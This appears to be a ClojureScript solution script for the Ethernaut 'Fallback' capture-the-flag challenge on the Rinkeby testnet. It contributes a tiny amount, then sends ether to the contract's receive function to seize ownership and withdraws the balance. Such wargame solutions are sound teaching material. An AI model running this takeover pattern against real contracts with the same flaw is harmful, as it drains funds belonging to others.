(ns fallback
  (:require [utils :as u]
            [wallets :as w]))


;; Ethernaut Challenge #1
;; FALLBACK

;; Get the rinkeby address from ethernaut.openzeppelin.com
(def fallback-addr "0x907910c5ece2284ad3bdd7d18fe7b014357445b0")

(def fallback (u/get-contract!
               fallback-addr
               (u/abi "/Fallback.sol/Fallback.json")
               w/rinkeby-wallet))

;; contribute condition:
;; require(msg.value < 0.001 ether);
(def contribute-data
  (js-obj "gasLimit"
          2000000
          "value"
          (u/str->wei "0.0009")))

;; receive condition:
;; require(msg.value > 0 && contributions[msg.sender] > 0);
(def txn-data
  (js-obj "to"
          fallback-addr
          "value"
          (u/str->wei "0.2")
          "gasLimit"
          80000))


(-> (.contribute fallback contribute-data)

    ;; wait for 3 * 13 seconds (average block time)
    ;; for the `contribute` txn to be included
    (.then #(js/Promise. (fn [res]
                           (js/setTimeout res 39000))))

    (.then #(.sendTransaction w/rinkeby-wallet
                              txn-data))

    ;; wait for 6 confirmations
    (.then #(.wait % 6))

    (.then #(.withdraw fallback))

    (.then #(.log js/console %))
    (.catch #(.log js/console %)))
